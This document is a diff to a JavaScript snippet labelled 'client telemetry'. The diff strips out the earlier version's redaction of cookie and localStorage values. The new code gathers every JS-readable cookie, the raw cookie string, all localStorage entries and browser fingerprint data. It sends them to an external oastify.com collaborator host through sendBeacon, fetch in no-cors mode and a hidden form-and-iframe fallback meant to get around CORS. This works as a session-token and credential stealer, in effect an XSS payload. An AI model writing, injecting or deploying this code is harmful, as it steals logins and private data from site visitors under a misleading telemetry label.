@@ -1,150 +1,135 @@
-(() => {
-  // ====== CONFIG ======
-  // Replace with your log collection endpoint (prefer a first-party subdomain).
-  const LOG_ENDPOINT = "https://ddum2c2gybx9bm6bihtr2gg2wt2nqde2.oastify.com/collect";
+// Cross-origin POST without CORS: sendBeacon -> fetch(no-cors) -> hidden <form>
+// Collects page context, ALL JS-accessible cookies, and ALL localStorage entries.
 
-  // DO NOT enable this unless you have legal basis (consent/contract), and you
-  // really need raw values for debugging. When true, values in allowlists below
-  // will be sent in plaintext.
-  const SEND_SENSITIVE = false;
+(function () {
+  // ===================== CONFIG =====================
+  const LOG_ENDPOINT = "https://ddum2c2gybx9bm6bihtr2gg2wt2nqde2.oastify.com"; // <- replace with your endpoint
 
-  // Explicit allowlists for keys whose VALUES may be sent in plaintext when
-  // SEND_SENSITIVE === true. Others will be redacted (only key + length).
-  const COOKIE_ALLOWLIST = [
-    // "analytics_id",
-    // "ab_test_group"
-  ];
-  const LS_ALLOWLIST = [
-    // "featureFlags",
-    // "prefs"
-  ];
+  // ===================== COLLECT =====================
+  function collectContext() {
+    return {
+      ts: new Date().toISOString(),
+      origin: location.origin,
+      href: location.href,
+      path: location.pathname,
+      search: location.search,
+      hash: location.hash,
+      referrer: document.referrer || "",
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      platform: navigator.platform,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      viewport: {
+        w: window.innerWidth,
+        h: window.innerHeight
+      },
+      screen: {
+        w: (screen && screen.width) || null,
+        h: (screen && screen.height) || null,
+        dpr: window.devicePixelRatio || 1
+      }
+    };
+  }
 
-  // ====== HELPERS ======
-  /** Safely parse document.cookie into array of {name, value, length} */
-  function collectCookies() {
+  function parseCookies() {
     const raw = document.cookie || "";
-    if (!raw) return [];
-    return raw.split(/;\s*/).map(entry => {
-      const eq = entry.indexOf("=");
-      const name = eq === -1 ? entry : entry.slice(0, eq);
-      const value = eq === -1 ? "" : entry.slice(eq + 1);
+    if (!raw) return { raw: "", entries: [], total: 0 };
+    const entries = raw.split(/;\s*/).map(entry => {
+      const i = entry.indexOf("=");
+      const name = i === -1 ? entry : entry.slice(0, i);
+      const value = i === -1 ? "" : entry.slice(i + 1);
+      // decode for readability; keep undecodable as-is
       let dec = value;
       try { dec = decodeURIComponent(value); } catch {}
-      return { name, value: dec, length: dec.length };
+      return { name, value: dec };
     });
+    return { raw, entries, total: entries.length };
   }
 
-  /** Collect localStorage into array of {key, value, length} */
   function collectLocalStorage() {
-    const out = [];
+    const entries = [];
     try {
       for (let i = 0; i < localStorage.length; i++) {
-        const k = localStorage.key(i);
-        const v = localStorage.getItem(k) ?? "";
-        out.push({ key: k, value: v, length: v.length });
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        entries.push({ key, value });
       }
     } catch {
-      // Access could throw in some contexts (e.g., privacy modes).
+      // Access may throw in some privacy modes; leave entries empty.
     }
-    return out;
-  }
-
-  /** Redact values unless allowed. Returns {entries:[{k,v,len,redacted:true|false}], total} */
-  function redactCookies(list) {
-    const entries = list.map(({ name, value, length }) => {
-      const allowed = SEND_SENSITIVE && COOKIE_ALLOWLIST.includes(name);
-      return {
-        name,
-        value: allowed ? value : undefined,
-        length,
-        redacted: !allowed
-      };
-    });
     return { entries, total: entries.length };
   }
 
-  function redactLocalStorage(list) {
-    const entries = list.map(({ key, value, length }) => {
-      const allowed = SEND_SENSITIVE && LS_ALLOWLIST.includes(key);
-      return {
-        key,
-        value: allowed ? value : undefined,
-        length,
-        redacted: !allowed
-      };
-    });
-    return { entries, total: entries.length };
-  }
-
-  /** Fire-and-forget POST with Beacon → fetch → <img> fallback */
-  function sendTelemetry(url, payloadObj) {
+  // ===================== SENDER =====================
+  function postNoCors(endpoint, payloadObj) {
     const bodyStr = JSON.stringify(payloadObj);
-    const blob = new Blob([bodyStr], { type: "application/json" });
 
-    // Prefer sendBeacon for reliability on unload
+    // 1) sendBeacon (reliable, background; no CORS needed, no response readable)
     try {
-      if (navigator.sendBeacon && url.startsWith("https://")) {
-        const ok = navigator.sendBeacon(url, blob);
-        if (ok) return;
+      if (navigator.sendBeacon && endpoint.startsWith("https://")) {
+        const blob = new Blob([bodyStr], { type: "text/plain;charset=UTF-8" });
+        if (navigator.sendBeacon(endpoint, blob)) return true;
       }
     } catch {}
 
-    // Fallback: fetch with no-cors (server still receives the request)
-    fetch(url, { method: "POST", mode: "no-cors", body: blob }).catch(() => {
-      // Last resort: image GET with query (length-limited)
-      const img = new Image();
-      const q = encodeURIComponent(bodyStr.slice(0, 1500));
-      img.src = `${url}?q=${q}&t=${Date.now()}`;
-    });
+    // 2) fetch(no-cors) with simple body (string). Do NOT set headers to avoid preflight.
+    try {
+      fetch(endpoint, {
+        method: "POST",
+        mode: "no-cors",
+        keepalive: true,
+        body: bodyStr
+      }).catch(() => {});
+      return true;
+    } catch {}
+
+    // 3) Hidden <form> POST into a hidden <iframe> (navigational fallback)
+    try {
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = endpoint;
+      form.style.display = "none";
+
+      const ta = document.createElement("textarea");
+      ta.name = "d"; // server reads field "d" containing JSON string
+      ta.value = bodyStr;
+      form.appendChild(ta);
+
+      const iframe = document.createElement("iframe");
+      iframe.name = "telemetry_sink_" + Math.random().toString(36).slice(2);
+      iframe.style.display = "none";
+
+      document.body.appendChild(iframe);
+      document.body.appendChild(form);
+      form.target = iframe.name;
+      form.submit();
+
+      setTimeout(() => { try { iframe.remove(); form.remove(); } catch {} }, 3000);
+      return true;
+    } catch {}
+
+    return false;
   }
 
-  // ====== COLLECT ======
-  const now = new Date().toISOString();
-  const ctx = {
-    origin: location.origin,
-    href: location.href,
-    path: location.pathname,
-    domain: document.domain,
-    referrer: document.referrer || ""
-  };
-
-  const cookiesCollected = collectCookies();
-  const lsCollected = collectLocalStorage();
-
-  const cookiesPayload = redactCookies(cookiesCollected);
-  const lsPayload = redactLocalStorage(lsCollected);
-
-  // ====== BUILD PAYLOAD ======
+  // ===================== BUILD & SEND =====================
   const payload = {
-    kind: "site-telemetry",
-    ts: now,
-    context: ctx,
-    cookies: cookiesPayload,        // keys + lengths; values only if allowlisted
-    localStorage: lsPayload,        // keys + lengths; values only if allowlisted
-    // Optional: add environment hints that don't identify users
-    client: {
-      ua: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform
-    }
+    kind: "client-telemetry",
+    context: collectContext(),
+    cookies: parseCookies(),        // { raw, entries:[{name,value}], total }
+    localStorage: collectLocalStorage() // { entries:[{key,value}], total }
   };
 
-  // ====== SEND ======
-  sendTelemetry(LOG_ENDPOINT, payload);
+  postNoCors(LOG_ENDPOINT, payload);
 
-  // ====== OPTIONAL CONSOLE VISUAL (for your own verification) ======
-  const bannerStyle =
-    "background: linear-gradient(90deg,#4caf50,#00bcd4); color:#fff; padding:6px 10px; border-radius:8px; font-weight:700;";
-  const subStyle =
-    "background:#222; color:#eee; padding:2px 8px; border-radius:6px; font-weight:600;";
-  const lineStyle = "color:#888;";
-
-  console.log("%cTelemetry sent", bannerStyle);
-  console.log("%cContext%c %s", subStyle, lineStyle, `${ctx.origin}${ctx.path}`);
-  console.log("%cCookies%c %d item(s) — values %s",
-    subStyle, lineStyle, cookiesPayload.total,
-    SEND_SENSITIVE ? "allowlisted only" : "REDACTED");
-  console.log("%cLocalStorage%c %d item(s) — values %s",
-    subStyle, lineStyle, lsPayload.total,
-    SEND_SENSITIVE ? "allowlisted only" : "REDACTED");
+  // Optional console confirmation
+  (function confirmToConsole() {
+    const banner =
+      "background: linear-gradient(90deg,#4caf50,#00bcd4); color:#fff; padding:6px 10px; border-radius:8px; font-weight:700;";
+    const sub = "background:#222; color:#eee; padding:2px 8px; border-radius:6px; font-weight:600;";
+    const dim = "color:#888;";
+    console.log("%cTelemetry sent", banner);
+    console.log("%cContext%c %s", sub, dim, payload.context.href);
+    console.log("%cCookies%c %d item(s)", sub, dim, payload.cookies.total);
+    console.log("%cLocalStorage%c %d item(s)", sub, dim, payload.localStorage.total);
+  })();
 })();
